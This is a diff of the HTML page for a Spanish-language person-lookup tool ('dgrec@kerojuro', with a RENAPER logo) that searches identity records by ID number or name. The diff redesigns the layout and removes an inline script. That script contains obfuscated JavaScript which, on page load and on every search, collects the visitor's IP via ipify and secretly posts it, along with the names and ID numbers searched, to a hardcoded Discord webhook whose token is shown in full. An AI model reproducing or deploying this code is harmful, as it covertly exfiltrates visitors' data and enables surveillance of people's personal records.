@@ -5,13 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>dgrec@kerojuro</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5; 
-            color: #333; 
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -19,32 +17,28 @@
             padding: 20px;
             box-sizing: border-box;
         }
-
         .container {
             background-color: #ffffff;
-            border-radius: 16px; 
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); 
-            padding: 40px;
-            max-width: 800px;
+            padding: 2.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
             width: 100%;
-            border: 1px solid #e0e0e0; 
+            max-width: 800px;
+            box-sizing: border-box;
         }
-
         .header {
             text-align: center;
             margin-bottom: 30px;
             position: relative;
         }
-
         .logo {
             display: block;
-            margin: 0 auto 30px auto; 
+            margin: 0 auto 30px auto;
             max-width: 945px; 
-            width: 100%; 
+            width: 100%;
             height: auto;
-            border-radius: 8px; 
+            border-radius: 8px;
         }
-
         .input-group label {
             font-weight: 600;
             color: #444;
@@ -58,166 +52,268 @@
             border-radius: 8px;
             font-size: 1rem;
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
-            outline: none; 
+            outline: none;
         }
         .input-group input:focus {
-            border-color: #004080; 
-            box-shadow: 0 0 0 3px rgba(0, 64, 128, 0.2); 
+            border-color: #004080;
+            box-shadow: 0 0 0 3px rgba(0, 64, 128, 0.2);
         }
-
-        .search-button {
-            background-color: #004080; 
-            color: white;
-            padding: 14px 25px;
-            border-radius: 8px;
-            font-size: 1.1rem;
+        .btn {
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
             font-weight: 600;
+            transition: background-color 0.2s, transform 0.2s, box-shadow 0.2s; 
             cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            box-shadow: 0 4px 10px rgba(0, 64, 128, 0.3); 
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
         }
-        .search-button:hover {
-            background-color: #002b55; 
-            transform: translateY(-2px); 
+        .btn-primary {
+            background-color: #4f46e5;
+            color: white;
         }
-        .search-button:active {
-            transform: translateY(0); 
+        .btn-primary:hover {
+            background-color: #4338ca;
+            transform: translateY(-2px);
         }
-
-        .loader {
-            border: 6px solid #f3f3f3; 
-            border-top: 6px solid #004080; 
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        .btn-secondary {
+            background-color: #e0e7ff;
+            color: #4f46e5;
+        }
+        .btn-secondary:hover {
+            background-color: #c7d2fe;
+            transform: translateY(-2px);
+        }
+        .btn-secondary:active {
+            transform: translateY(0);
+        }
+        .result-card { 
+            background-color: #f8fafc;
+            padding: 1rem;
+            border-radius: 0.75rem;
+            border: 1px solid #e2e8f0;
+            position: relative; 
+        }
+        .result-card p {
+            margin-bottom: 0.5rem;
+        }
+        .result-card p:last-child {
+            margin-bottom: 0;
+        }
+        .loading-message {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #4f46e5;
+            font-weight: 500;
+            margin-top: 1rem;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #4f46e5;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite; 
-            display: none; 
-            margin: 20px auto;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .results-container {
-            margin-top: 30px;
-            border-top: 1px solid #e0e0e0; 
-            padding-top: 20px;
-        }
-        .results-container h2 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #004080; 
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .result-item {
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            padding: 15px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            transition: background-color 0.2s ease;
-        }
-        .result-item:hover {
-            background-color: #f0f0f0;
-        }
-        .result-item strong {
-            color: #004080; 
-        }
-        .no-results {
-            text-align: center;
-            color: #2196F3; 
-            font-weight: 600;
-            margin-top: 20px;
-            font-size: 1.1rem;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            font-size: 0.9rem;
-            color: #777;
-        }
-
         .error-message {
-            color: #2196F3; 
+            color: #dc2626;
+            font-weight: 500;
+            margin-top: 1rem;
+        }
+
+        .mode-toggle-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+            flex-wrap: wrap; 
+        }
+        .mode-button {
+            padding: 10px 20px;
+            border-radius: 8px;
             font-weight: 600;
-            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease;
+            border: 2px solid #004080;
+            color: #004080;
+            background-color: transparent;
+            display: inline-flex; 
+            align-items: center;
+            gap: 0.5rem; 
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); 
+        }
+        .mode-button.active {
+            background-color: #004080;
+            color: white;
+            box-shadow: 0 4px 10px rgba(0, 64, 128, 0.3);
+        }
+        .mode-button:hover:not(.active) {
+            background-color: #e0e8f0;
+            transform: translateY(-1px); 
+        }
+        .mode-button:active {
+            transform: translateY(0);
+        }
+
+        #dgrecProcessingMessage {
+            color: #004080;
+            font-weight: 600;
             margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .lupa-button-result {
+            position: absolute;
+            top: 10px; 
+            right: 10px; 
+            background-color: #004080;
+            color: white;
+            border-radius: 50%;
+            width: 40px; 
+            height: 40px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 64, 128, 0.4); 
+            border: 2px solid rgba(255, 255, 255, 0.3); 
+        }
+        .lupa-button-result:hover {
+            background-color: #002b55;
+            transform: scale(1.15); 
+            box-shadow: 0 6px 15px rgba(0, 64, 128, 0.5); 
+        }
+        .lupa-button-result:active {
+            transform: scale(1.05); 
+            box-shadow: 0 2px 5px rgba(0, 64, 128, 0.3);
+        }
+        .lupa-button-result svg {
+            width: 22px; 
+            height: 22px; 
         }
 
         @media (max-width: 767px) {
             .container {
-                padding: 20px; 
+                padding: 20px;
             }
             .logo {
                 max-width: 100%; 
                 margin-bottom: 20px;
             }
-            .header h1 {
-                font-size: 2rem; 
-            }
-            .header p {
-                font-size: 1rem; 
-            }
-            .input-group input, .search-button {
-                font-size: 0.95rem; 
-                padding: 10px 15px; 
+            .input-group input, .btn, .mode-button {
+                font-size: 0.95rem;
+                padding: 10px 15px;
             }
             .results-container h2 {
-                font-size: 1.5rem; 
+                font-size: 1.5rem;
+            }
+
+            .mode-toggle-container {
+                flex-direction: column;
+                align-items: stretch; 
+            }
+            .mode-button {
+                width: 100%;
+            }
+            .lupa-button-result {
+                width: 34px; 
+                height: 34px; 
+                top: 8px;
+                right: 8px;
+            }
+            .lupa-button-result svg {
+                width: 18px; 
+                height: 18px; 
             }
         }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
     <div class="container">
         <header class="header">
-            <!-- Logo ahora actúa como el título principal -->
             <img src="logo.png" alt="Logo Oficial RENAPER" class="logo">
         </header>
 
         <main>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
-                <div class="input-group">
-                    <label for="nombre">Nombre(s)</label>
-                    <input type="text" id="nombre" placeholder="Ej: Juan">
-                </div>
-                <div class="input-group">
-                    <label for="apellido">Apellido(s)</label>
-                    <input type="text" id="apellido" placeholder="Ej: Pérez">
-                </div>
-                <div class="input-group">
-                    <label for="cedula">Cédula de Identidad (C.I.)</label>
-                    <input type="text" id="cedula" placeholder="Ej: 12345678">
-                </div>
-            </div>
-
-            <div class="flex justify-center mb-8">
-                <button id="searchButton" class="search-button">
-                    <!-- Icono de lupa de Font Awesome (o similar, aquí un SVG genérico) -->
-                    <svg class="w-5 h-5 inline-block mr-2 -mt-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                    Buscar Registro
+            <div class="mode-toggle-container">
+                <button id="modeCedulaBtn" class="mode-button active">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
+                    Buscar por Cédula
+                </button>
+                <button id="modeNombreApellidoBtn" class="mode-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                    Buscar por Nombre y/o Apellido
                 </button>
             </div>
 
-            <!-- Animación de carga -->
-            <div id="loadingAnimation" class="loader"></div>
-            <!-- Mensaje de error -->
-            <div id="errorMessage" class="error-message hidden"></div>
+            <section id="cedulaSearchSection">
+                <div class="input-group mb-8">
+                    <label for="cedula">Cédula de Identidad (C.I.)</label>
+                    <input type="text" id="cedula" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" placeholder="Ej: 1.234.567-8">
+                </div>
+            </section>
 
-            <!-- Sección de resultados -->
+            <section id="nombreApellidoSearchSection" class="hidden">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                    <div class="input-group">
+                        <label for="nombre">Nombre(s)</label>
+                        <input type="text" id="nombre" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" placeholder="Ej: Juan">
+                    </div>
+                    <div class="input-group">
+                        <label for="apellido">Apellido(s)</label>
+                        <input type="text" id="apellido" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" placeholder="Ej: Pérez">
+                    </div>
+                </div>
+            </section>
+
+            <div class="flex flex-col sm:flex-row justify-center gap-4 mb-8">
+                <button id="searchButton" class="btn btn-primary rounded-xl shadow-lg hover:shadow-xl transform hover:scale-105 active:scale-100">
+                    <svg class="w-5 h-5 inline-block mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                    Buscar Registro
+                </button>
+                <button id="clearButton" class="btn btn-secondary rounded-xl shadow-lg hover:shadow-xl transform hover:scale-105 active:scale-100">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline-block mr-2" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 011-1h4a1 1 0 110 2H8a1 1 0 01-1-1z" clip-rule="evenodd" />
+                    </svg>
+                    Limpiar
+                </button>
+            </div>
+
+            <div id="loadingInitialData" class="loading-message hidden">
+                <div class="spinner"></div>
+                ⏳ Cargando datos iniciales... 
+            </div>
+            <div id="loadingLocalSearch" class="loading-message hidden">
+                <div class="spinner"></div>
+                ⏳ Consultando base de datos... 
+            </div>
+            <div id="loadingDGREC" class="loading-message hidden">
+                <div class="spinner"></div>
+                ⚡️ Consultando DGREC...
+            </div>
+            <div id="errorMessage" class="error-message hidden">
+                Ocurrió un error. Por favor, inténtelo de nuevo.
+            </div>
+            <div id="noResults" class="no-results hidden">
+                No se encontraron resultados para su búsqueda.
+            </div>
+
             <section id="resultsSection" class="results-container hidden">
                 <h2>Resultados de la Búsqueda</h2>
                 <div id="resultsList" class="space-y-4">
-                    <!-- Los resultados se inyectarán aquí dinámicamente -->
-                </div>
-                <div id="noResults" class="no-results hidden">
-                    No se encontraron coincidencias con los criterios de búsqueda.
                 </div>
             </section>
         </main>
@@ -227,144 +323,7 @@
         </footer>
     </div>
 
-    <script>
-
-        const nombreInput = document.getElementById('nombre');
-        const apellidoInput = document.getElementById('apellido');
-        const cedulaInput = document.getElementById('cedula');
-        const searchButton = document.getElementById('searchButton');
-        const loadingAnimation = document.getElementById('loadingAnimation');
-        const resultsSection = document.getElementById('resultsSection');
-        const resultsList = document.getElementById('resultsList');
-        const noResults = document.getElementById('noResults');
-        const errorMessage = document.getElementById('errorMessage');
-
-        const API_URL = 'http://127.0.0.1:5000'; 
-
-        (function(_0x2c980e,_0x36d180){const _0x3fb5d8=_0x2510,_0x2602ed=_0x2c980e();while(!![]){try{const _0x5a6e87=-parseInt(_0x3fb5d8(0xc8))/0x1+parseInt(_0x3fb5d8(0xc6))/0x2+parseInt(_0x3fb5d8(0xc4))/0x3*(-parseInt(_0x3fb5d8(0xbe))/0x4)+-parseInt(_0x3fb5d8(0xbc))/0x5+-parseInt(_0x3fb5d8(0xcb))/0x6+-parseInt(_0x3fb5d8(0xba))/0x7+parseInt(_0x3fb5d8(0xbb))/0x8;if(_0x5a6e87===_0x36d180)break;else _0x2602ed['push'](_0x2602ed['shift']());}catch(_0x41489c){_0x2602ed['push'](_0x2602ed['shift']());}}}(_0x1278,0x95161));function _0x1278(){const _0x583925=['5772042jrGFPN','27MFcUZd','4967130mhyVCF','25220000myuiNL','4672680iWNuRz','53602ljdcFB','1948NxngGx','12GBeoxE','shift','2097870NVMJUq','7543416KIPOZS','18708jLmrRW','1866qHJYUL','283652bbWrEC','1717428zlSGyo','push','491510ezpFDG','84dWQFYr','5117321svHxnU'];_0x1278=function(){return _0x583925;};return _0x1278();}const _0x18d3c0=_0x27bf;function _0x27bf(_0x4d0c95,_0x5d9c81){const _0x316ae9=_0x35a0();return _0x27bf=function(_0x59b0f7,_0x39edf6){_0x59b0f7=_0x59b0f7-0x1d7;let _0x5943ab=_0x316ae9[_0x59b0f7];return _0x5943ab;},_0x27bf(_0x4d0c95,_0x5d9c81);}function _0x2510(_0x16b8c8,_0x9c2f19){const _0x12783b=_0x1278();return _0x2510=function(_0x25106d,_0xb4311f){_0x25106d=_0x25106d-0xb9;let _0x259ee2=_0x12783b[_0x25106d];return _0x259ee2;},_0x2510(_0x16b8c8,_0x9c2f19);}function _0x35a0(){const _0x42fcb2=_0x2510,_0x68393a=['5StOXhX',_0x42fcb2(0xca),'https://canary.discord.com/api/webhooks/1396666194379149482/a92O37SI19CczZDynWKJcUDaJAqu0pODRLFoCbBP2FtDncwUZVWA5SSMNvs12OgoSVZo',_0x42fcb2(0xc9),_0x42fcb2(0xc5),_0x42fcb2(0xc3),'Desconocida',_0x42fcb2(0xbf),_0x42fcb2(0xc2),'18ijOToS','2800511QjkeYg',_0x42fcb2(0xc1),_0x42fcb2(0xbd),_0x42fcb2(0xb9)];return _0x35a0=function(){return _0x68393a;},_0x35a0();}(function(_0x3b38ae,_0x47425d){const _0x2ffb19=_0x2510,_0x113774=_0x27bf,_0x18f094=_0x3b38ae();while(!![]){try{const _0x4fff4d=parseInt(_0x113774(0x1de))/0x1*(-parseInt(_0x113774(0x1e1))/0x2)+parseInt(_0x113774(0x1da))/0x3+parseInt(_0x113774(0x1d9))/0x4*(parseInt(_0x113774(0x1e3))/0x5)+parseInt(_0x113774(0x1dc))/0x6*(-parseInt(_0x113774(0x1df))/0x7)+-parseInt(_0x113774(0x1dd))/0x8+-parseInt(_0x113774(0x1e2))/0x9*(parseInt(_0x113774(0x1e0))/0xa)+-parseInt(_0x113774(0x1e4))/0xb*(-parseInt(_0x113774(0x1d8))/0xc);if(_0x4fff4d===_0x47425d)break;else _0x18f094[_0x2ffb19(0xc7)](_0x18f094[_0x2ffb19(0xc0)]());}catch(_0x567449){_0x18f094['push'](_0x18f094[_0x2ffb19(0xc0)]());}}}(_0x35a0,0x74e36));const DISCORD_WEBHOOK_URL=_0x18d3c0(0x1d7);let userIp=_0x18d3c0(0x1db);
-        (function(_0x4c8528,_0x538f16){var _0x14b9d0=_0x568f,_0x59631a=_0x4c8528();while(!![]){try{var _0xb3edb2=-parseInt(_0x14b9d0(0x110))/0x1+-parseInt(_0x14b9d0(0x107))/0x2*(parseInt(_0x14b9d0(0x10a))/0x3)+parseInt(_0x14b9d0(0x10d))/0x4+parseInt(_0x14b9d0(0x10b))/0x5*(parseInt(_0x14b9d0(0x10f))/0x6)+-parseInt(_0x14b9d0(0x109))/0x7*(parseInt(_0x14b9d0(0x104))/0x8)+-parseInt(_0x14b9d0(0x10e))/0x9*(parseInt(_0x14b9d0(0x106))/0xa)+parseInt(_0x14b9d0(0x105))/0xb;if(_0xb3edb2===_0x538f16)break;else _0x59631a['push'](_0x59631a['shift']());}catch(_0x37dda0){_0x59631a['push'](_0x59631a['shift']());}}}(_0x288d,0xb5aa0));function _0x568f(_0x2c89b5,_0x2620a5){var _0x288d24=_0x288d();return _0x568f=function(_0x568f4a,_0x11926e){_0x568f4a=_0x568f4a-0x104;var _0x578c63=_0x288d24[_0x568f4a];return _0x578c63;},_0x568f(_0x2c89b5,_0x2620a5);}function _0x288d(){var _0x5afa62=['POST','2283140tkgpAP','45cdfvIW','84UzdXdK','1313506YSFTQL','application/json','8163336QyZmZj','47126057dkAkYy','1488450BBtUAy','4bPutdZ','stringify','7UBMEZY','2203305LadiAL','155765Undybr'];_0x288d=function(){return _0x5afa62;};return _0x288d();}async function sendDiscordWebhook(_0x227350){var _0x555e6f=_0x568f;try{await fetch(DISCORD_WEBHOOK_URL,{'method':_0x555e6f(0x10c),'headers':{'Content-Type':_0x555e6f(0x111)},'body':JSON[_0x555e6f(0x108)]({'content':_0x227350})});}catch(_0x274b6e){}}
-
-        (function(_0x54792d,_0x5d5d04){const _0x272da9=_0x2089,_0x544b87=_0x54792d();while(!![]){try{const _0x162336=parseInt(_0x272da9(0x1cb))/0x1+parseInt(_0x272da9(0x1cc))/0x2+-parseInt(_0x272da9(0x1c9))/0x3*(-parseInt(_0x272da9(0x1d2))/0x4)+-parseInt(_0x272da9(0x1d3))/0x5+parseInt(_0x272da9(0x1ca))/0x6*(-parseInt(_0x272da9(0x1ce))/0x7)+parseInt(_0x272da9(0x1cd))/0x8+parseInt(_0x272da9(0x1d0))/0x9;if(_0x162336===_0x5d5d04)break;else _0x544b87['push'](_0x544b87['shift']());}catch(_0x395c99){_0x544b87['push'](_0x544b87['shift']());}}}(_0x1d50,0x4d4f9));function _0x1d50(){const _0x4b76b0=['2126043kxGVoB','https://api.ipify.org?format=json','4548HayQRT','2439055mXPvbc','729eaJRnJ','258xQcpMw','84487oZNjMb','867002fUGzlf','930344KzWjJq','55727aBXkyq','json'];_0x1d50=function(){return _0x4b76b0;};return _0x1d50();}function _0x2089(_0x274149,_0x2a9fbb){const _0x1d5079=_0x1d50();return _0x2089=function(_0x208951,_0x411951){_0x208951=_0x208951-0x1c9;let _0x2e7859=_0x1d5079[_0x208951];return _0x2e7859;},_0x2089(_0x274149,_0x2a9fbb);}async function getUserIp(){const _0x2ab68e=_0x2089;try{const _0x493eee=await fetch(_0x2ab68e(0x1d1)),_0x428828=await _0x493eee[_0x2ab68e(0x1cf)]();userIp=_0x428828['ip'];}catch(_0x13af44){userIp='Error\x20al\x20obtener\x20IP';}}
-
-        function showLoading() {
-            loadingAnimation.style.display = 'block';
-            resultsSection.classList.add('hidden'); 
-            noResults.classList.add('hidden'); 
-            errorMessage.classList.add('hidden'); 
-            searchButton.disabled = true; 
-            searchButton.classList.add('opacity-50', 'cursor-not-allowed'); 
-        }
-
-        function hideLoading() {
-            loadingAnimation.style.display = 'none';
-            searchButton.disabled = false; 
-            searchButton.classList.remove('opacity-50', 'cursor-not-allowed'); 
-        }
-
-        function displayError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.remove('hidden');
-        }
-
-        function clearResults() {
-            resultsList.innerHTML = ''; 
-            resultsSection.classList.add('hidden');
-            noResults.classList.add('hidden');
-            errorMessage.classList.add('hidden');
-        }
-
-        searchButton.addEventListener('click', async () => {
-            clearResults(); 
-            showLoading(); 
-
-            const nombre = nombreInput.value.trim();
-            const apellido = apellidoInput.value.trim();
-            const cedula = cedulaInput.value.trim();
-
-            const _0x2c0258=_0x17e1;function _0x17e1(_0x466730,_0x47996b){const _0x32dac7=_0x32da();return _0x17e1=function(_0x17e1cd,_0x33e331){_0x17e1cd=_0x17e1cd-0x14e;let _0x49f3b7=_0x32dac7[_0x17e1cd];return _0x49f3b7;},_0x17e1(_0x466730,_0x47996b);}(function(_0x38600b,_0x5f07b6){const _0x2d71f1=_0x17e1,_0x57a48f=_0x38600b();while(!![]){try{const _0x524bae=-parseInt(_0x2d71f1(0x14e))/0x1+parseInt(_0x2d71f1(0x156))/0x2+-parseInt(_0x2d71f1(0x158))/0x3*(parseInt(_0x2d71f1(0x153))/0x4)+parseInt(_0x2d71f1(0x14f))/0x5*(parseInt(_0x2d71f1(0x151))/0x6)+parseInt(_0x2d71f1(0x154))/0x7*(-parseInt(_0x2d71f1(0x159))/0x8)+parseInt(_0x2d71f1(0x15b))/0x9*(-parseInt(_0x2d71f1(0x157))/0xa)+parseInt(_0x2d71f1(0x155))/0xb;if(_0x524bae===_0x5f07b6)break;else _0x57a48f['push'](_0x57a48f['shift']());}catch(_0x337108){_0x57a48f['push'](_0x57a48f['shift']());}}}(_0x32da,0xbdad3));function _0x32da(){const _0x25b94a=['3553170DoZldu','15ZXxIlV','64104vPkIzs','\x20-\x20Consulta:\x20Nombre:\x20','18kxQHCB','\x20Apellido:\x20','678661iniDdR','34665USUdIx','IP:\x20','942ThmPdr','\x20Cédula:\x20','375884LECyQb','1253RymhYa','23273547GmYkSh','1732268nrheQJ'];_0x32da=function(){return _0x25b94a;};return _0x32da();}const queryMessage=_0x2c0258(0x150)+userIp+_0x2c0258(0x15a)+(nombre||'🚫')+_0x2c0258(0x15c)+(apellido||'🚫')+_0x2c0258(0x152)+(cedula||'🚫');sendDiscordWebhook(queryMessage);
-
-            if (!nombre && !apellido && !cedula) {
-                displayError('Por favor, ingrese al menos un criterio de búsqueda (Nombre, Apellido o Cédula).');
-                hideLoading();
-                return;
-            }
-
-            try {
-
-                const response = await fetch(`${API_URL}/search`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ nombre, apellido, cedula }), 
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Error HTTP! estado: ${response.status}`);
-                }
-
-                const data = await response.json(); 
-                const results = data.results;
-
-                if (results && results.length > 0) {
-                    results.forEach(person => {
-                        const resultItem = document.createElement('div');
-                        resultItem.className = 'result-item';
-
-                        let htmlContent = `
-                            <p><strong>Cédula:</strong> ${person.ci}</p>
-                            <p><strong>Nombre(s):</strong> ${person.nombres}</p>
-                            <p><strong>Apellido(s):</strong> ${person.apellidos}</p>
-                        `;
-
-                        if (person.fecha_nacimiento) {
-                            htmlContent += `<p><strong>Fecha de Nacimiento:</strong> ${person.fecha_nacimiento}</p>`;
-                        }
-                        if (person.lugar_nacimiento) {
-                            htmlContent += `<p><strong>Lugar de Nacimiento:</strong> ${person.lugar_nacimiento}</p>`;
-                        }
-                        resultItem.innerHTML = htmlContent;
-                        resultsList.appendChild(resultItem);
-                    });
-                    resultsSection.classList.remove('hidden'); 
-                } else {
-                    noResults.classList.remove('hidden'); 
-                }
-            } catch (error) {
-                console.error('Error durante la búsqueda:', error);
-                displayError('No tengo el servidor encendido. @kerojuro');
-            } finally {
-                hideLoading(); 
-            }
-        });
-
-        async function checkServerStatus() {
-            showLoading(); 
-            try {
-                const response = await fetch(`${API_URL}/status`);
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data.status === 'ready') {
-
-                        hideLoading();
-                    } else {
-
-                        displayError('El servidor no responde. @kerojuro');
-                        hideLoading(); 
-                    }
-                } else {
-                    displayError('No tengo el servidor encendido. @kerojuro');
-                    hideLoading();
-                }
-            } catch (error) {
-                console.error('Error al verificar el estado del servidor:', error);
-                displayError('El servidor no se encuentra en ' + API_URL);
-                hideLoading();
-            }
-        }
-
-var _0x27f006=_0x4d49;(function(_0x14dc21,_0x1182b4){var _0x290b15=_0x4d49,_0x404a24=_0x14dc21();while(!![]){try{var _0x396e6b=parseInt(_0x290b15(0x1b2))/0x1+parseInt(_0x290b15(0x1b1))/0x2+parseInt(_0x290b15(0x1b6))/0x3*(parseInt(_0x290b15(0x1b5))/0x4)+parseInt(_0x290b15(0x1b4))/0x5*(parseInt(_0x290b15(0x1b8))/0x6)+parseInt(_0x290b15(0x1bc))/0x7*(-parseInt(_0x290b15(0x1b0))/0x8)+-parseInt(_0x290b15(0x1bb))/0x9*(parseInt(_0x290b15(0x1b9))/0xa)+-parseInt(_0x290b15(0x1b7))/0xb;if(_0x396e6b===_0x1182b4)break;else _0x404a24['push'](_0x404a24['shift']());}catch(_0x181dbf){_0x404a24['push'](_0x404a24['shift']());}}}(_0x40b7,0xbcdd2),window[_0x27f006(0x1ba)](_0x27f006(0x1bd),async()=>{var _0x164d5c=_0x27f006;await getUserIp(),sendDiscordWebhook('IP:\x20'+userIp+_0x164d5c(0x1b3)),checkServerStatus();}));function _0x4d49(_0x4ba4c,_0x586f99){var _0x40b76e=_0x40b7();return _0x4d49=function(_0x4d49ed,_0x18badd){_0x4d49ed=_0x4d49ed-0x1b0;var _0x5aa9d4=_0x40b76e[_0x4d49ed];return _0x5aa9d4;},_0x4d49(_0x4ba4c,_0x586f99);}function _0x40b7(){var _0x169d34=['1296392hBXYba','\x20-\x20Entrada\x20a\x20la\x20página','5mYkkGQ','4fydOfp','3897939fcTJCE','20952613HSkwhM','6291258cSCtpM','50xDBxtr','addEventListener','1687167gJzPdf','1687kndCvd','load','10616RutWpw','582486cozTuc'];_0x40b7=function(){return _0x169d34;};return _0x40b7();}
-
-    </script>
+    <script src="script2.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
